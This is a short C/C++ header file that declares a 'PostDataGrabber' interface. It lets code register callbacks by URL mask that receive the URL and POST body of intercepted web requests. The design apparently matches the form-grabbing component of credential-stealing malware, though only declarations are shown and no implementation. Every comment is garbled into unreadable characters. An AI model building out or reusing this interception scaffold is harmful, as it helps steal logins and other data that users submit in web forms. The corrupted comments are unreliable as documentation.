//������� ����� ������ ���������� ����������

#ifndef PostDataGrabberH
#define PostDataGrabberH

namespace PostDataGrabber
{
	struct ParamEvent
	{
		const char* url; 
		const char* data; //������ ���� �������
	};

	typedef void (*TypeFuncReceiver)( ParamEvent& ); //��� ������� ������� ����� ���������� ����������

	struct Receiver
	{
		char* urlMask; //�� ����� ��� �����������
		TypeFuncReceiver FuncReceiver; //������� ���������� �������
	};

	bool Init();
	void Release();

	Receiver* AddReceiver( const char* urlMask, TypeFuncReceiver FuncReceiver );
	void DelReceiver( Receiver* receiver );

	void DoEvents( const char* url, const char* postData ); //����� �������
}

#endif //PostDataGrabberH
